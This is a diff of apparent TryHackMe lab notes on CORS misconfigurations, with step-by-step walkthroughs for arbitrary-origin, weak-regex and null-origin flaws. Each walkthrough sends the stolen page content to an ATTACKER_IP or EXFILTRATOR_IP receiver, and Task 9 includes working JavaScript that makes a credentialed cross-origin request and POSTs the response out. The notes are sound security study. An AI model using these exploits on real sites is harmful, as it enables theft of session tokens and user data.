@@ -107,127 +107,161 @@ Reflecting arbitrary Origin headers:    Echoing back any Origin in Access-Contro
 
 Secure Handling of Origin Checks
 
-    A secure CORS handling flow: 
-        Reject 'null' origins, check if the origin is in an allowlist, and only set Access-Control-Allow-Origin if allowed. 
-        Otherwise, deny the request. This reduces CORS risks. 
-
-Note: Using * is safe only for public, non-sensitive resources without credentials.
-
-__________________________________________________________________________________________
-
-
-TASK 5 Common Misconfigurations
-
-CORS misconfigurations can expose web applications to attacks. Common issues include:
-
-    Accepting 'null' origins
-        Allows requests from local files or data URLs, which attackers can exploit. 
-        Always reject 'null' unless required.
-
-    Weak origin validation (bad regex)
-        Poorly written regex can match unintended domains (e.g., /example.com$/ matches badexample.com). 
-        Use strict, tested patterns.
-
-    Reflecting arbitrary Origin headers
-        Echoing any Origin in Access-Control-Allow-Origin lets any site access resources. 
-        Only allow trusted origins from a defined allowlist.
-
-Secure Handling of Origin Checks
-
     It first checks if the origin is 'null' and rejects such requests. 
     If not, it checks whether the origin is in a predefined allowlist. 
     If the origin is in the allowlist, the server sets Access-Control-Allow-Origin to the origin and proceeds with the request. 
     Otherwise, it rejects the request, ensuring only allowlisted origins are allowed. 
     This method minimizes the risk of CORS-related vulnerabilities.
 
-Note :  "Security" in CORS depends on context. 
-        Using an allowlist and rejecting unspecified origins is safer for sensitive resources. 
-        However, setting Access-Control-Allow-Origin to * is acceptable for public, non-sensitive resources that do not use credentials.
+Note: Using * is safe only for public, non-sensitive resources without credentials.
 
 __________________________________________________________________________________________
 
 
-TASK 
+TASK 7 Arbitrary Origin
 
+Exploiting an Arbitrary Origin vulnerability is relatively easy compared to other CORS vulnerabilities since the application accepts cross-origin requests from any domain name. 
+For example, below is the vulnerable code of http://corssop.thm/arbitrary.php:
 
+    /*************************************************************************************
+    * if (isset($_SERVER['HTTP_ORIGIN'])){
+    *     header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']."");
+    *     header('Access-Control-Allow-Credentials: true');
+    * }
+    *************************************************************************************/
 
+1. Vulnerability summary
+    - The server echoes the Origin header into Access-Control-Allow-Origin without validation, allowing any origin (e.g., http://evilcors.thm) to bypass SOP.
 
+2. Prepare the exploit
+    - Open http://corssop.thm/exploits/data_exfil.html on the exploit hosting server.
+    - Change the target URL to: http://corssop.thm/arbitrary.php
+    - Change the exfiltration receiver URL to your attacker server (e.g., ATTACKER_IP:81/receiver.php for AttackBox Apache).
+    - Save the page on the exploit server.
 
-__________________________________________________________________________________________
+3. Verify the hosted exploit
+    - Click "View exploit" on the exploit server to open the hosted page in a new tab.
+    - Open Developer Tools > Network in that tab.
 
+4. Execute the exploit
+    - On the exploit server homepage, click "Send to victim" (the victim will visit http://evilcors.thm and load the hosted exploit).
+    - In DevTools you should see two XHRs: the first to the target (corssop.thm/arbitrary.php), the second to your receiver (ATTACKER_IP:81).
 
-TASK 
+5. Confirm exfiltration
+    - Check the exploit server logs for a request from the victim IP (may differ depending on network).
+    - On the attacker server, check /var/www/html/data.txt (or receiver logs) for the POST containing the fetched page content.
 
-
-
-
-__________________________________________________________________________________________
-
-TASK
-
-__________________________________________________________________________________________
-
-
-TASK 5 Saving the output
-
-Save Nmap scan results to a file using formats like Normal, Grepable, or XML. 
-
-Normal
-
-    Save scan results in normal format using -oN FILENAME. Example:
-           
-        /*************************************************************************************
-        * pentester@TryHackMe$ cat MACHINE_IP_scan.nmap 
-        * # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oN MACHINE_IP_scan 10.48.152.80
-        * Nmap scan report for 10.48.152.80
-        * Host is up (0.00086s latency).
-        * Not shown: 994 closed ports
-        * PORT    STATE SERVICE VERSION
-        * 22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
-        * 25/tcp  open  smtp    Postfix smtpd
-        * 80/tcp  open  http    nginx 1.6.2
-        * 110/tcp open  pop3    Dovecot pop3d
-        * 111/tcp open  rpcbind 2-4 (RPC #100000)
-        * 143/tcp open  imap    Dovecot imapd
-        * MAC Address: 02:A0:E7:B5:B6:C5 (Unknown)
-        * Device type: general purpose
-        * Running: Linux 3.X
-        * OS CPE: cpe:/o:linux:linux_kernel:3.13
-        * OS details: Linux 3.13
-        * Network Distance: 1 hop
-        * Service Info: Host:  debra2.thm.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-        *
-        * OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-        * # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds
-        *************************************************************************************/
-
-Grepable
-
-    The grepable format (-oG FILENAME) condenses results for easy filtering with tools like grep, but is less readable than normal output.
-
-        /*************************************************************************************
-        * pentester@TryHackMe$ cat MACHINE_IP_scan.gnmap 
-        * # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oG MACHINE_IP_scan 10.48.152.80
-        * Host: 10.48.152.80	Status: Up
-        * Host: 10.48.152.80	Ports: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/	Ignored State: closed (994)	OS: Linux 3.13	Seq Index: 257	IP ID Seq: All zeros
-        * # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds
-        *************************************************************************************/
-
-    Using grep on normal output lacks the host's IP, e.g., "80/tcp open http nginx 1.6.2," making it less useful for multiple scans. 
-    Grepable output includes the IP, providing complete information per line.
-            
-        /*************************************************************************************
-        * pentester@TryHackMe$ grep http MACHINE_IP_scan.gnmap 
-        * Host: 10.48.152.80	Ports: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/	Ignored State: closed (994)	OS: Linux 3.13	Seq Index: 257	IP ID Seq: All zeros
-        *************************************************************************************/
-
-XML
-    The third format is XML, saved with -oX FILENAME. 
-    Use -oA FILENAME to save in all three formats: normal, grepable, and XML.
+6. Note on real-world impact
+    - If the target response contains sensitive data (cookies, tokens, user data), the exploit can capture and send it to the attacker server. 
+      Proper origin validation or an allowlist prevents this.
 
 __________________________________________________________________________________________
 
 
+TASK 8 Bad Regex in Origin
+
+/*************************************************************************************
+* if (isset($_SERVER['HTTP_ORIGIN']) && preg_match('#corssop.thm#', $_SERVER['HTTP_ORIGIN'])) {
+*     header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']."");
+*     header('Access-Control-Allow-Credentials: true');
+* }
+*************************************************************************************/
+
+1. Vulnerability summary
+    - The server uses a weak regex (#corssop.thm#) to validate Origin and echoes it in ACAO.
+    - Any origin containing "corssop.thm" (e.g., http://corssop.thm.evilcors.thm) will be allowed, enabling cross-origin access.
+
+2. Prepare the exploit
+    - Open http://corssop.thm/exploits/data_exfil.html on the exploit hosting server.
+    - Set the target URL to: http://corssop.thm/badregex.php
+    - Set the exfiltration receiver URL to your attacker server (e.g., ATTACKER_IP:81/receiver.php).
+    - Save the page on the exploit server.
+
+3. Verify the hosted exploit
+    - Click "View exploit" on the exploit server to open the hosted page in a new tab.
+    - Open Developer Tools > Network in that tab.
+
+4. Execute the exploit
+    - On the exploit server homepage, click "Send to victim" (the victim will visit http://corssop.thm.evilcors.thm and load the hosted exploit).
+    - In DevTools you should see two XHRs: the first to the target (corssop.thm/badregex.php), the second to your receiver (ATTACKER_IP:81).
+
+5. Confirm exfiltration
+    - Check the exploit server logs for a request from the victim IP.
+    - On the attacker server, check /var/www/html/data.txt (or receiver logs) for the POST containing the fetched page content.
+
+6. Note on real-world impact
+    - Sensitive responses (cookies, tokens, user data) can be exfiltrated if ACAO is improperly set.
+    - Fix by using strict origin comparisons or an explicit allowlist; avoid matching substrings with loose regexes.
+
+__________________________________________________________________________________________
+
+TASK 9 Null Origin
+
+/*************************************************************************************
+* if (isset($_SERVER['HTTP_ORIGIN']) && $_SERVER['HTTP_ORIGIN'] === 'null') {
+*     header('Access-Control-Allow-Origin: null');
+*     header('Access-Control-Allow-Credentials: true');
+* }
+*************************************************************************************/
+
+1. Vulnerability summary
+    - The server explicitly allows the "null" origin in ACAO and permits credentials, trusting requests originating from file://, data: or sandboxed contexts.
+    - This enables an attacker-hosted page (e.g., a data URL or local file) to perform authenticated requests and read responses in the victim's browser.
+
+2. Prepare the exploit
+    - Host an exploit page (data URL or local file) that loads a hidden iframe which runs JavaScript to request the vulnerable endpoint (http://corssop.thm/null.php) with credentials.
+    - Set the exfiltration receiver to your attacker server (e.g., http://EXFILTRATOR_IP/receiver.php).
+
+3. Verify the hosted exploit
+    - Open the exploit page in a browser (e.g., via file:// or data: URL).
+    - Open Developer Tools > Network to observe outbound XHRs.
+
+4. Execute the exploit
+    - When the victim opens the exploit (or a stored XSS triggers it), the iframe/script issues an XHR to http://corssop.thm/null.php with withCredentials=true.
+    - Because ACAO: null and Allow-Credentials: true are present, the browser allows the response to be read and the script can POST it to the attacker server.
+
+5. Confirm exfiltration
+    - Check your attacker receiver logs (or /var/www/html/data.txt) for a POST containing the fetched page content from the victim.
+    - Confirm presence of sensitive data (session tokens, user info) in the exfiltrated payload.
+
+6. Note on real-world impact
+    - Allowing 'null' as ACAO with credentials is dangerous; remove/nullify this header or require explicit allowlist checks. Use strict origin validation and avoid trusting non-standard origins.
+
+Sample exploit (keep and embed on your exploit hosting server or as a data: URL)
+
+    /*************************************************************************************
+    * <div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
+    *     <iframe id="exploitFrame" style="display:none;"></iframe>
+    *     <textarea id="load" style="width: 1183px; height: 305px;"></textarea>
+    * </div>
+    *
+    * <script>
+    *   // Change EXFILTRATOR_IP to your listener
+    *   var exploitCode = `
+    *     <script>
+    *       function exploit() {
+    *         var xhttp = new XMLHttpRequest();
+    *         xhttp.open("GET", "http://corssop.thm/null.php", true);
+    *         xhttp.withCredentials = true;
+    *         xhttp.onreadystatechange = function() {
+    *           if (this.readyState == 4 && this.status == 200) {
+    *             var xhr = new XMLHttpRequest();
+    *             xhr.open("POST", "http://EXFILTRATOR_IP/receiver.php", true);
+    *             xhr.withCredentials = true;
+    *             xhr.send(this.responseText);
+    *           }
+    *         };
+    *         xhttp.send();
+    *       }
+    *       exploit();
+    *     <\/script>
+    *   `;
+    *   var encodedExploit = btoa(exploitCode);
+    *   document.getElementById('exploitFrame').src = 'data:text/html;base64,' + encodedExploit;
+    * </script>
+    *************************************************************************************/
+
+__________________________________________________________________________________________
 
 
 Appendix:
